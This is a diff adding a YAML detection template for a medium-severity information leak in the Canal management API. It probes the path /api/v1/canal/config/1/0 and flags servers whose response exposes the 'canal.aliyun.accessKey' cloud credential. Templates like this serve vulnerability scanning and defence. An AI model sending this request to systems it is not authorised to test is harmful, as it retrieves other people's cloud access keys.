@@ -1,0 +1,17 @@
+id: poc-yaml-canal-info-leak
+info:
+  name: Canal 管理 API 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: Canal
+  osprey-id: vb_2021_0025
+requests:
+- method: GET
+  path: /api/v1/canal/config/1/0
+  expression: 'status_code == 200 && contains(body, "{\"code\":20000,\"message\"")
+    && contains(body, "canal.aliyun.accessKey")
+
+    '
+variables: {}
+transport: http
